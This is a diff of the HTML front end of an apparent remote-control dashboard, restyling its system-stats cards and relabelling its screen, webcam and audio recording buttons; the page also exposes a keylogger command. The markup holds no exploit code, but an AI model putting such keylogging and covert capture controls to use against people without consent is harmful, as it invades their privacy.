@@ -28,6 +28,7 @@
     <link rel="stylesheet" href="css/fixes.css" />
     <link rel="stylesheet" href="css/layout.css" />
     <link rel="stylesheet" href="css/components.css" />
+    <link rel="stylesheet" href="css/modules/system-stats.css" />
     <link rel="stylesheet" href="css/modules/terminal.css" />
     <link rel="stylesheet" href="css/modules/webcam.css" />
     <link rel="stylesheet" href="css/modules/keylogger.css" />
@@ -122,7 +123,7 @@
                     class="fas fa-chart-line text-primary text-sm opacity-10"
                   ></i>
                 </div>
-                <span class="nav-link-text ms-1">Dashboard</span>
+                <span class="nav-link-text ms-1">Overview</span>
               </a>
             </li>
             <li class="nav-item">
@@ -228,14 +229,14 @@
                 class="breadcrumb bg-transparent mb-0 pb-0 pt-1 px-0 me-sm-6 me-5"
               >
                 <li class="breadcrumb-item text-sm">
-                  <a class="opacity-5 text-dark" href="javascript:;">Pages</a>
+                  <a class="opacity-5 text-dark" id="breadcrumb-root" href="javascript:;">Pages</a>
                 </li>
                 <li
                   class="breadcrumb-item text-sm text-dark active font-weight-bolder"
                   aria-current="page"
                   id="breadcrumb-current"
                 >
-                  Dashboard
+                  Overview
                 </li>
               </ol>
               <h6 class="font-weight-bolder mb-0" id="page-title">Overview</h6>
@@ -266,167 +267,88 @@
         </nav>
         <div class="container-fluid py-4">
           <section id="tab-dashboard" class="tab-content active">
-            <div class="row">
-              <div class="col-xl-3 col-sm-6 mb-4">
-                <div class="card">
-                  <div class="card-body p-3">
-                    <div class="row">
-                      <div class="col-8">
-                        <div class="numbers">
-                          <p
-                            class="text-sm mb-0 text-capitalize font-weight-bold"
-                          >
-                            CPU Usage
-                          </p>
-                          <h5
-                            class="font-weight-bolder mb-0"
-                            id="disp-cpu-freq"
-                          >
-                            0%
-                            <span
-                              class="text-success text-sm font-weight-bolder"
-                              id="cpu-change"
-                              >+0%</span
-                            >
-                          </h5>
-                          <p class="mb-0 text-sm" id="disp-cpu-temp">
-                            <span class="text-secondary">Temp:</span> --°C
-                          </p>
-                        </div>
-                      </div>
-                      <div class="col-4 text-end">
-                        <div
-                          class="icon icon-shape bg-gradient-primary shadow text-center border-radius-md"
-                        >
-                          <i class="fas fa-microchip text-lg opacity-10"></i>
-                        </div>
-                      </div>
+            <div class="system-stats-grid">
+              <!-- CPU Card -->
+              <div class="stat-card">
+                <div class="stat-card__header">
+                  <span class="stat-card__title">CPU Load</span>
+                  <span class="stat-badge state-ok" id="stat-cpu-badge">Normal</span>
+                </div>
+                <div class="stat-card__body">
+                  <div class="gauge gauge--lg">
+                    <svg class="gauge__svg" viewBox="0 0 140 140">
+                      <circle class="gauge__track" cx="70" cy="70" r="55" fill="none"></circle>
+                      <!-- Decorative ticks for CPU gauge -->
+                      <circle class="gauge__ticks" cx="70" cy="70" r="55" pathLength="100" fill="none"></circle>
+                      <circle class="gauge__progress" id="stat-cpu-gauge" cx="70" cy="70" r="55" fill="none"></circle>
+                    </svg>
+                    <div class="gauge__center">
+                      <span class="gauge__label">CPU</span>
+                      <span class="gauge__value" id="stat-cpu-percent">0%</span>
+                      <span class="gauge__sub" id="stat-cpu-freq">--</span>
                     </div>
                   </div>
+                  <div class="stat-footer">Threads optimized</div>
                 </div>
               </div>
 
-              <div class="col-xl-3 col-sm-6 mb-4">
-                <div class="card">
-                  <div class="card-body p-3">
-                    <div class="row">
-                      <div class="col-8">
-                        <div class="numbers">
-                          <p
-                            class="text-sm mb-0 text-capitalize font-weight-bold"
-                          >
-                            RAM Usage
-                          </p>
-                          <h5
-                            class="font-weight-bolder mb-0"
-                            id="disp-ram-usage"
-                          >
-                            0%
-                            <span
-                              class="text-danger text-sm font-weight-bolder"
-                              id="ram-change"
-                              >--</span
-                            >
-                          </h5>
-                          <p class="mb-0 text-sm">
-                            <span class="text-secondary" id="ram-used"
-                              >0 GB</span
-                            >
-                            / <span id="ram-total">0 GB</span>
-                          </p>
-                        </div>
-                      </div>
-                      <div class="col-4 text-end">
-                        <div
-                          class="icon icon-shape bg-gradient-success shadow text-center border-radius-md"
-                        >
-                          <i class="fas fa-memory text-lg opacity-10"></i>
-                        </div>
-                      </div>
-                    </div>
+              <!-- GPU Card -->
+              <div class="stat-card">
+                <div class="stat-card__header">
+                  <span class="stat-card__title">GPU Activity</span>
+                  <span class="stat-badge state-ok" id="stat-gpu-badge">Idle</span>
+                </div>
+                <div class="stat-card__body stat-card__body--split">
+                  <div class="bar-vertical">
+                    <div class="bar-vertical__fill" id="stat-gpu-bar"></div>
+                  </div>
+                  <div class="stat-values">
+                    <span class="stat-values__label">Usage</span>
+                    <span class="stat-values__value" id="stat-gpu-percent">0%</span>
+                    <span class="stat-values__sub" id="stat-gpu-info">--</span>
                   </div>
                 </div>
+                <div class="stat-footer">VRAM allocation</div>
               </div>
 
-              <div class="col-xl-3 col-sm-6 mb-4">
-                <div class="card">
-                  <div class="card-body p-3">
-                    <div class="row">
-                      <div class="col-8">
-                        <div class="numbers">
-                          <p
-                            class="text-sm mb-0 text-capitalize font-weight-bold"
-                          >
-                            GPU Load
-                          </p>
-                          <h5
-                            class="font-weight-bolder mb-0"
-                            id="disp-gpu-vram"
-                          >
-                            0%
-                            <span
-                              class="text-info text-sm font-weight-bolder"
-                              id="gpu-change"
-                              >Normal</span
-                            >
-                          </h5>
-                          <p class="mb-0 text-sm">
-                            <span class="text-secondary">VRAM:</span>
-                            <span id="vram-val">-- MB</span>
-                          </p>
-                        </div>
-                      </div>
-                      <div class="col-4 text-end">
-                        <div
-                          class="icon icon-shape bg-gradient-danger shadow text-center border-radius-md"
-                        >
-                          <i class="fas fa-video text-lg opacity-10"></i>
-                        </div>
-                      </div>
-                    </div>
+              <!-- RAM Card -->
+              <div class="stat-card">
+                <div class="stat-card__header">
+                  <span class="stat-card__title">Memory</span>
+                  <span class="stat-badge state-ok" id="stat-ram-badge">OK</span>
+                </div>
+                <div class="stat-card__body stat-card__body--split">
+                  <div class="bar-vertical">
+                    <div class="bar-vertical__fill" id="stat-ram-bar"></div>
+                  </div>
+                  <div class="stat-values">
+                    <span class="stat-values__label">Usage</span>
+                    <span class="stat-values__value" id="stat-ram-percent">0%</span>
+                    <span class="stat-values__sub" id="stat-ram-abs">--</span>
                   </div>
                 </div>
+                <div class="stat-footer">RAM availability</div>
               </div>
 
-              <div class="col-xl-3 col-sm-6 mb-4">
-                <div class="card">
-                  <div class="card-body p-3">
-                    <div class="row">
-                      <div class="col-8">
-                        <div class="numbers">
-                          <p
-                            class="text-sm mb-0 text-capitalize font-weight-bold"
-                          >
-                            Disk Usage
-                          </p>
-                          <h5
-                            class="font-weight-bolder mb-0"
-                            id="disp-disk-free"
-                          >
-                            0%
-                            <span
-                              class="text-warning text-sm font-weight-bolder"
-                              id="disk-change"
-                              >--</span
-                            >
-                          </h5>
-                          <p class="mb-0 text-sm">
-                            <span class="text-secondary" id="disk-used"
-                              >0 GB</span
-                            >
-                            / <span id="disk-total">0 GB</span>
-                          </p>
-                        </div>
-                      </div>
-                      <div class="col-4 text-end">
-                        <div
-                          class="icon icon-shape bg-gradient-info shadow text-center border-radius-md"
-                        >
-                          <i class="fas fa-hdd text-lg opacity-10"></i>
-                        </div>
-                      </div>
+              <!-- SSD Card -->
+              <div class="stat-card">
+                <div class="stat-card__header">
+                  <span class="stat-card__title" id="stat-ssd-name">Primary Disk</span>
+                  <span class="stat-badge state-ok" id="stat-ssd-badge">Healthy</span>
+                </div>
+                <div class="stat-card__body">
+                  <div class="gauge gauge--sm">
+                    <svg class="gauge__svg" viewBox="0 0 120 120">
+                      <circle class="gauge__track" cx="60" cy="60" r="44" fill="none"></circle>
+                      <circle class="gauge__progress" id="stat-ssd-gauge" cx="60" cy="60" r="44" fill="none"></circle>
+                    </svg>
+                    <div class="gauge__center">
+                      <span class="gauge__label">SSD</span>
+                      <span class="gauge__value" id="stat-ssd-percent">0%</span>
+                      <span class="gauge__sub" id="stat-ssd-abs">--</span>
                     </div>
                   </div>
+                  <div class="stat-footer">Disk utilization</div>
                 </div>
               </div>
             </div>
@@ -527,6 +449,40 @@
                             <td class="w-30">
                               <div class="d-flex px-2 py-1">
                                 <div>
+                                  <i class="fas fa-tachometer-alt text-secondary me-2"></i>
+                                </div>
+                                <div class="d-flex flex-column justify-content-center">
+                                  <h6 class="mb-0 text-sm">CPU Max Clock</h6>
+                                </div>
+                              </div>
+                            </td>
+                            <td>
+                              <p class="text-sm font-weight-bold mb-0" id="cpu-max">
+                                --
+                              </p>
+                            </td>
+                          </tr>
+                          <tr>
+                            <td class="w-30">
+                              <div class="d-flex px-2 py-1">
+                                <div>
+                                  <i class="fas fa-layer-group text-info me-2"></i>
+                                </div>
+                                <div class="d-flex flex-column justify-content-center">
+                                  <h6 class="mb-0 text-sm">CPU Cores</h6>
+                                </div>
+                              </div>
+                            </td>
+                            <td>
+                              <p class="text-sm font-weight-bold mb-0" id="cpu-cores">
+                                --
+                              </p>
+                            </td>
+                          </tr>
+                          <tr>
+                            <td class="w-30">
+                              <div class="d-flex px-2 py-1">
+                                <div>
                                   <i class="fas fa-video text-danger me-2"></i>
                                 </div>
                                 <div
@@ -542,6 +498,23 @@
                                 id="gpu-name"
                               >
                                 Loading...
+                              </p>
+                            </td>
+                          </tr>
+                          <tr>
+                            <td class="w-30">
+                              <div class="d-flex px-2 py-1">
+                                <div>
+                                  <i class="fas fa-memory text-success me-2"></i>
+                                </div>
+                                <div class="d-flex flex-column justify-content-center">
+                                  <h6 class="mb-0 text-sm">VRAM</h6>
+                                </div>
+                              </div>
+                            </td>
+                            <td>
+                              <p class="text-sm font-weight-bold mb-0" id="vram-val">
+                                --
                               </p>
                             </td>
                           </tr>
@@ -825,7 +798,7 @@
                     </div>
                     <div class="mt-2 text-end">
                       <span class="badge badge-success hidden" id="save-badge"
-                        ><i class="fas fa-check"></i> Saved on Server</span
+                        ><i class="fas fa-check"></i> Saved</span
                       >
                     </div>
                     <hr class="horizontal dark my-3" />
@@ -868,10 +841,10 @@
                     <button
                       id="btn-monitor-cancel"
                       onclick="cancelRecordScreen()"
-                      class="btn btn-secondary w-100 fw-bold mt-2"
+                      class="btn btn-warning w-100 fw-bold mt-2"
                       disabled
                     >
-                      <i class="fas fa-stop"></i> CANCEL
+                      <i class="fas fa-stop-circle"></i> CANCEL RECORD
                     </button>
                   </div>
                 </div>
@@ -1008,10 +981,10 @@
                     <button
                       id="btn-webcam-cancel"
                       onclick="cancelRecordWebcam()"
-                      class="btn btn-secondary w-100 fw-bold mt-2"
+                      class="btn btn-warning w-100 fw-bold mt-2"
                       disabled
                     >
-                      <i class="fas fa-stop"></i> CANCEL
+                      <i class="fas fa-stop-circle"></i> CANCEL RECORD
                     </button>
                   </div>
                 </div>
@@ -1105,10 +1078,10 @@
                       <button
                         id="btn-audio-cancel"
                         onclick="cancelRecordAudio()"
-                        class="btn btn-secondary w-100 fw-bold mt-2"
+                        class="btn btn-warning w-100 fw-bold mt-2"
                         disabled
                       >
-                        <i class="fas fa-stop"></i> CANCEL
+                        <i class="fas fa-stop-circle"></i> CANCEL RECORD
                       </button>
 
                       <hr class="horizontal dark my-3" />
@@ -1270,17 +1243,15 @@
                   ><i class="fas fa-list-alt text-primary"></i> Task
                   Manager</span
                 >
-                <div>
+                  <div class="d-flex align-items-center gap-2">
                   <button
                     id="btn-get-apps"
-                    onclick="getApps()"
                     class="btn btn-outline-primary btn-sm"
                   >
                     Apps Only
                   </button>
                   <button
                     id="btn-get-processes"
-                    onclick="getProcesses()"
                     class="btn btn-outline-secondary btn-sm"
                   >
                     All Processes
@@ -1299,8 +1270,8 @@
                   </thead>
                   <tbody>
                     <tr>
-                      <td colspan="4" class="text-center">
-                        No data. Click refresh buttons above.
+                      <td colspan="4" class="text-center text-secondary">
+                        Auto-refreshing... waiting for data.
                       </td>
                     </tr>
                   </tbody>
@@ -1342,7 +1313,7 @@
                       </button>
                       <button
                         onclick="sendCommand('STOP_KEYLOG')"
-                        class="btn btn-secondary btn-sm me-1"
+                        class="btn btn-sm me-1 keylog-stop-btn"
                         title="Stop Log"
                         style="padding: 2px 8px"
                       >
